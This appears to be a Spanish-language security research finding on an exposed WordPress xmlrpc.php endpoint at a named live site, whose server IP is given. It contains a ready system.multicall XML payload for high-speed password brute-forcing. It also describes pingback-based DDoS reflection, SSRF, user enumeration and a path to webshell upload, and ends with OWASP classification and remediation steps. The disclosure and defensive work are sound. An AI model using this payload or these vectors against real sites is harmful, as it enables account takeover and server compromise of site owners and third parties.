# 1.12 — xmlrpc.php expuesto en pelotalibretv.su

**Fecha de análisis:** 14 de mayo de 2026  
**Investigador:** Walter Jaldín  
**Herramienta:** curl (POST directo a xmlrpc.php)

---

## Identificación

`pelotalibretv.su/xmlrpc.php` responde HTTP 200 a peticiones POST con la API completa de WordPress XML-RPC activa y sin protección adicional.

---

## Evidencia — system.listMethods (sin autenticación)

**Request:**
```
POST https://pelotalibretv.su/xmlrpc.php
Content-Type: text/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>
```

**Response: HTTP 200 — 80 métodos expuestos:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params><param><value><array><data>
    <value><string>system.multicall</string></value>
    <value><string>system.listMethods</string></value>
    <value><string>system.getCapabilities</string></value>
    <value><string>pingback.extensions.getPingbacks</string></value>
    <value><string>pingback.ping</string></value>
    <value><string>wp.getUsersBlogs</string></value>
    <value><string>wp.getUsers</string></value>
    <value><string>wp.uploadFile</string></value>
    <value><string>wp.setOptions</string></value>
    <value><string>wp.newPost</string></value>
    <value><string>wp.editPost</string></value>
    <value><string>wp.deletePost</string></value>
    <value><string>wp.getPost</string></value>
    <value><string>wp.getPosts</string></value>
    <value><string>wp.getAuthors</string></value>
    <!-- 65+ métodos adicionales... -->
  </data></array></value></param></params>
</methodResponse>
```

---

## Vectores de ataque habilitados

### Vector 1: Brute Force de credenciales — system.multicall

`system.multicall` permite enviar múltiples peticiones de autenticación en un solo request HTTP. Esto convierte el endpoint en un vector de fuerza bruta de alta velocidad:

```xml
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password1</string></value>
      </data></array></value></member>
    </value>
    <!-- Repetir con 500+ contraseñas distintas en un solo request -->
  </data></array></value></param></params>
</methodCall>
```

Con `system.multicall`, un atacante puede probar **cientos de contraseñas por request** evadiendo rate limiting que solo cuenta por número de peticiones HTTP.

### Vector 2: Pingback abuse — DDoS reflection

`pingback.ping` permite indicarle a WordPress que notifique a un URL externo. Sin autenticación requerida para este método, puede usarse para:

1. **DDoS reflection:** Usar pelotalibretv.su como amplificador para atacar terceros
2. **SSRF (Server-Side Request Forgery):** Hacer que el servidor solicite URLs internas
3. **Port scanning:** Detectar servicios internos del servidor

### Vector 3: Enumeración de usuarios — wp.getUsers

Con credenciales válidas, `wp.getUsers` devuelve la lista completa de usuarios del WordPress. Combinado con brute-force:
1. Enumerar usernames via `/wp-json/wp/v2/users` (API REST pública)
2. Usar xmlrpc para brute-force de contraseñas de los usuarios encontrados

### Vector 4: Carga de archivos — wp.uploadFile

Con credenciales de autor o superior, `wp.uploadFile` permite subir archivos arbitrarios al servidor. Si se logra autenticación, esto puede conducir a:
- Carga de webshell PHP
- Acceso completo al servidor (138.226.244.112, Virtual Systems LLC)

---

## Respuesta a credenciales inválidas

**Confirmado:** El endpoint valida autenticación para métodos protegidos pero **no tiene rate limiting** observable:

```
POST wp.getUsersBlogs (admin:admin) → HTTP 200 + faultCode 403 "Incorrect username or password."
```

La respuesta HTTP es siempre 200 — la autenticación fallida devuelve un fault XML, no un HTTP 4xx. Esto significa que herramientas estándar de rate limiting por código HTTP no funcionan.

---

## Clasificación OWASP

| OWASP | Categoría | Descripción |
|---|---|---|
| A1 | Broken Access Control | system.listMethods accesible sin auth |
| A5 | Security Misconfiguration | xmlrpc.php activo sin protección |
| A7 | Identification and Authentication Failures | Sin rate limiting en brute force |
| WSTG-CONF-006 | HTTP Methods | Métodos innecesarios expuestos |

**Severidad:** ALTA — La exposición de xmlrpc.php sin protección en un sitio WordPress de alto tráfico (Tranco top 500 para la red pelotalibretv/futbol-libre) representa un riesgo crítico de compromiso del servidor.

---

## Recomendaciones (para el paper)

1. **Deshabilitar xmlrpc.php** vía `.htaccess` o plugins de seguridad
2. **Bloquear en nginx/apache** si no se usa
3. **Habilitar rate limiting** por IP en autenticación
4. **Usar Fail2ban** para detectar intentos de brute force via xmlrpc

---
